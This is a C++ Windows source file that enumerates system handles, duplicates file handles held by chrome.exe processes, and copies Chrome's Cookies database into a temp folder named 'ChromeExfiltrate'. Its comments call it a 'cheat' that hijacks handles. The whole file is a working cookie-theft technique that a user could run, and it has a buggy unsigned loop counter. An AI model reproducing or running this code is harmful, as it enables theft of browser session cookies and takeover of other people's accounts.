#include <Windows/util/ApiLoader/ApiTypeDefs.h>
#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>
#include <General/util/Process/Process.h>
#include <spdlog/spdlog.h>
#include <boost/filesystem.hpp>
#include <Windows/util/Common.h>

int HijackExistingHandle()
{
    boost::filesystem::path tempPath = boost::filesystem::temp_directory_path();
    HMODULE Ntdll = GetModuleHandleA("ntdll"); // get the base address of ntdll.dll
    // get the address of NtQuerySystemInformation in ntdll.dll so we can find all the open handles on our system
    auto NtQuerySystemInformation =
        (zzj::ApiLoader::pNtQuerySystemInformation)GetProcAddress(Ntdll, "NtQuerySystemInformation");

    // get the address of NtDuplicateObject in ntdll.dll so we can duplicate an existing handle into our cheat,
    // basically performing the hijacking
    auto NtDuplicateObject = (zzj::ApiLoader::pNtDuplicateObject)GetProcAddress(Ntdll, "NtDuplicateObject");

    // get the address of NtOpenProcess in ntdll.dll so wecan create a Duplicate handle
    auto NtOpenProcess = (zzj::ApiLoader::pNtOpenProcess)GetProcAddress(Ntdll, "NtOpenProcess");

    // initialize the Object Attributes structure, you can just set each member to NULL rather than create a function
    // like i did
    OBJECT_ATTRIBUTES Obj_Attribute = {0};
    Obj_Attribute.Length            = sizeof(OBJECT_ATTRIBUTES);

    // clientID is a PDWORD or DWORD* of the process id to create a handle to
    CLIENT_ID clientID = {0};

    // the size variable is the amount of bytes allocated to store all the open handles
    DWORD size = sizeof(SYSTEM_HANDLE_INFORMATION);

    // we allocate the memory to store all the handles on the heap rather than the stack becuase of the large amount of
    // data
    SYSTEM_HANDLE_INFORMATION *hInfo = (SYSTEM_HANDLE_INFORMATION *)new byte[size]{0};


    // we use this for checking if the Native functions succeed
    NTSTATUS NtRet = NULL;
    HANDLE procHandle     = NULL;
    HANDLE hProcess       = NULL;
    HANDLE HijackedHandle = NULL;
    do
    {
        // delete the previously allocated memory on the heap because it wasn't large enough to store all the handles
        delete[] hInfo;

        // increase the amount of memory allocated by 50%
        size *= 1.5;
        try
        {
            // set and allocate the larger size on the heap
            hInfo = (PSYSTEM_HANDLE_INFORMATION) new byte[size];
        }
        catch (std::bad_alloc) // catch a bad heap allocation.
        {
            spdlog::error("Bad alloc!");
        }
        Sleep(1); // sleep for the cpu

        // we continue this loop until all the handles have been stored
    } while ((NtRet = NtQuerySystemInformation(SystemHandleInformation, hInfo, size, NULL)) ==
             STATUS_INFO_LENGTH_MISMATCH);

    // check if we got all the open handles on our system
    if (!NT_SUCCESS(NtRet))
    {
        throw std::runtime_error("Failed to get all handles");
    }
    // loop through each handle on our system, and find the file handle that we want to hijack
    for (unsigned int i = hInfo->HandleCount -1; i>=0; --i)
    {
        if (i % 0x1000 == 0)
            std::cout << std::hex << i << std::endl;
        // check if the current handle is valid, otherwise increment i and check the next handle
        if (!zzj::ScopeKernelHandle::IsHandleValid((HANDLE)hInfo->Handles[i].Handle))
        {
            continue;
        }


        // Duplicate the handle into our process
        clientID.UniqueProcess = (HANDLE)hInfo->Handles[i].ProcessId;
        NtRet = NtOpenProcess(&procHandle, PROCESS_DUP_HANDLE, &Obj_Attribute, &clientID);
        DEFER
        {
            if(procHandle)
                CloseHandle(procHandle);
        };

        if(!zzj::ScopeKernelHandle::IsHandleValid(procHandle)|| !NT_SUCCESS(NtRet))
            continue;

        zzj::ProcessV2 process((int)clientID.UniqueProcess);
        std::string exePath = process.GetExecutableFilePath();
        if (exePath.find("chrome.exe") == std::string::npos)
			continue;

        // Duplicate the handle into our process
        NtRet = NtDuplicateObject(procHandle, (HANDLE)hInfo->Handles[i].Handle, GetCurrentProcess(), &HijackedHandle,
                                  0, 0, DUPLICATE_SAME_ACCESS);

        if (!zzj::ScopeKernelHandle::IsHandleValid(HijackedHandle) || !NT_SUCCESS(NtRet))
            continue;

        DEFER
        {
            if(HijackedHandle)
                CloseHandle(HijackedHandle);
        };

        boost::filesystem::path fileHandlePath;
        try
        {
            fileHandlePath = zzj::ScopeKernelHandle::GetFileHandlePath(HijackedHandle);
        }
        catch (const std::exception &ex)
        {
            continue;
        }


        std::string strFileName = fileHandlePath.string();

        // check if the file name is the one we want to hijack C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Network
        if (strFileName.find("Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies") != std::string::npos)
        {
            spdlog::info("Found handle path {}", strFileName);
            boost::filesystem::path tempPath = boost::filesystem::temp_directory_path();
            tempPath /= "ChromeExfiltrate";
            if(!boost::filesystem::exists(tempPath))
            {
                boost::filesystem::create_directory(tempPath);
            }
            boost::filesystem::path filePath = strFileName;
            tempPath /= filePath.filename();
            std::fstream file(tempPath.string(), std::ios::out | std::ios::binary);
            //read the file and save the content to a file
            char buffer[1024];
            DWORD dwBytesRead = 0;
            auto setFilePointerRes = SetFilePointer(HijackedHandle, 0, NULL, FILE_BEGIN);
            if (setFilePointerRes == INVALID_SET_FILE_POINTER)
                continue;
            while (ReadFile(HijackedHandle, buffer, 1024, &dwBytesRead, NULL) && dwBytesRead > 0)
                file.write(buffer, dwBytesRead);
            file.close();
        }
    }
    return 0;
}
bool FilterFunc(const SYSTEM_HANDLE_TABLE_ENTRY_INFO &info, const HANDLE& duplicateHandle)
{
    auto fileHandlePath     = zzj::ScopeKernelHandle::GetFileHandlePath(duplicateHandle);
    if (fileHandlePath.empty())
        return false;
    std::string strFileName = fileHandlePath.string();
    if (strFileName.find(
            "Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies") ==
        std::string::npos)
        return false;

    return true;
}
int main()
{
    auto res = zzj::ScopeKernelHandle::FindIf(FilterFunc);
    boost::filesystem::path tempPath = boost::filesystem::temp_directory_path();
    tempPath /= "ChromeExfiltrate";
    if (!boost::filesystem::exists(tempPath))
    {
        boost::filesystem::create_directory(tempPath);
    }
    boost::filesystem::path filePath = "cookie";
    tempPath /= filePath.filename();
    std::fstream file(tempPath.string(), std::ios::out | std::ios::binary);
    // read the file and save the content to a file
    char buffer[1024];
    DWORD dwBytesRead      = 0;
    auto setFilePointerRes = SetFilePointer(std::get<1>(res[0]), 0, NULL, FILE_BEGIN);
    if (setFilePointerRes == INVALID_SET_FILE_POINTER)
        return -1;
    while (ReadFile(std::get<1>(res[0]), buffer, 1024, &dwBytesRead, NULL) && dwBytesRead > 0)
        file.write(buffer, dwBytesRead);
    file.close();
    return 0;
}